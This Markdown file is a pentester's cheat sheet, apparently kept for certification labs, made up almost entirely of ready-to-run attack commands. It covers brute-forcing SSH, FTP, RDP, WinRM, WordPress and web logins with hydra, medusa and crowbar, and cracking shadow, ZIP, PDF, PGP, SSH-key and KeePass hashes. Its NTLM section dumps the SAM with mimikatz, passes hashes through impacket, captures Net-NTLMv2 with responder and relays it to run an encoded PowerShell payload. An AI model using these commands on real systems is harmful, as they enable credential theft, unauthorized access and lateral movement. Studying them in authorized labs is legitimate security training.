
## Bruteforce

### Links
- [HTTP Basic Auth Hydra](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)
- [CrackStation](https://crackstation.net/)
### Create Wordlist

#### Cewl + Hydra
```
# Create a Wordlist of a website and Put the whole path of the website

cewl -w wordlist.txt -d 5 http://<IP>/html5

# Change -l user and pass, post request and Failed request, -s is for port

hydra -l root@localhost -P wordlist.txt <IP> http-post-form "</otrs/index.pl>:Action=Login&RequestedURL=&Lang=en&TimeOffset=300&User=^USER^&Password=^PASS^:Login Failed" -V

hydra -L ../usernames.txt -P /root/scripts/wordlist/CeWL/pw.txt 10.11.1.39 http-post-form "</otrs/index.pl>:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

# Creating a Wordlist with Cewl
cewl www.testwebsite.com -m 6 -w pass.txt # -m is min 6 length word

# Creating wordlist + Adding a rule in Johntheripper
sudo nano /etc/john/john.conf

-> Add this rule in last, Add two numbers to the end of each password
$[0-9]$[0-9]

# Took the wordlist, added rules, and outputted in mutated.txt
john --wordlist=pass.txt --rules --stdout > mutated.txt 
```
### Hash Finder
```
hashid <hash value>
hash-identifier
haiti 'hash' # Gives hashcat ID as well
```

### Hashcat
```
hashcat -m <ID> hash /usr/share/wordlists/rockyou.txt --force # Google hash ID
hashcat -a 0 <hash.txt> /usr/share/wordlists/rockyou.txt —show
```
### John the Ripper (Windows hashes)
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT # Rules
```

### John the Ripper (Linux hashes)
```
-> First combine shadow and password and use a tool called unshadow.
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
PDF or ZIP
```
### Cracking the hash of PDF
```
pdf2john test.pdf > hash 
OR
zip2john test.zip > hash
```
### Cracking the hash that was found
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```



### Medusa

```
medusa -h <IP> -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```
### Tomcat GET: 

```
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt http-get://<IP>:8080/manager/html
```

### RDP
```
crowbar -b rdp -s <IP> -u <admin> -C rockyou.txt -n 1
```

### Evil-winrm

```
crackmapexec winrm <IP> -d <domain> -u users.txt -p password.txt
```
 
### SSH
```
hydra -l <user> -P /usr/share/wordlists/rokyou.txt <ssh>://<IP> -s <port>
hydra -l <user> -P /usr/share/wordlists/metasploit/unix_passwords.txt <IP> ssh -t 4 -V

For SSH, if you can get the id_rsa file and passphrase, use that to login:

chmod 600 id_rsa
ssh -i id_rsa -p 2222 dave@192.168.50.201

or crack the password first:
ssh2john id_rsa > ssh.hash
cat ssh.hash //remove first line
hashcat -h | grep -i "ssh"
//Make a modified rule list of possible
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
//If hashcat doesn't work, try add rule to JtR
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
john --wordlist=ssh.passwords --rules=sshRules ssh.hash


```

### HTTP-GET
```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt http-get://<IP>
```

### HTTP-POST
```
hydra <IP> http-form-post <"/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN"> -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```

### FTP
```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt -vV <IP> ftp
```

### ZIP
```
fcrackzip -v -u -b -D -p /usr/share/wordlists/rockyou.txt secrets.zip
```

### Unshadow
```
/etc/shadow + /etc/passwd
# Grab both and do the following command
unshadow <passwd file> <shadow file> > unshadowed.txt
```

### WordPress
```
wpscan --url <IP> -U users.txt -P pass.txt
wpscan --url http://test.com/
```

### ASC
```
gpg2john tryhackme.asc > hash
john hash -w=/usr/share/wordlists/rockyou.txt
gpg —import tryhackme.asc # Enter the passphrase
gpg —decrypt credentials.pgp
```

### KeepPass

```
For password managers like KeepPass, try to get the database to extract hashes:

ls -la Database.kdbx
ls -la Database.kdbx

keepass2john Database.kdbx > keepass.hash
or
keepass2john Database.kdb | grep -o "$keepass$.*" >  CrackThis.hash

cat keepass.hash
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

### NTLM

```
NTLM
---
Get-LocalUser
.\mimikatz.exe // As admin
privilege::debug
token::elevate
lsadump::sam
//Get hash
hashcat --help | grep -i "ntlm"
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

or pass it:
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

Net-NTLM-v2
---
You need a revers shell on victim first:
nc 192.168.50.211 4444
net user paul
sudo responder -I tun0 //basically setups a smb server
try to connect to it from victim:
dir \\192.168.119.2\test
That will gen a hash you can crack:
hashcat --help | grep -i "ntlm"
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
*Note: Might see a web upload, so capture it and change file name to the responder smb listner, i.e. \\\\Kali_IP\\test*

For the relay do this instead of responder:

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```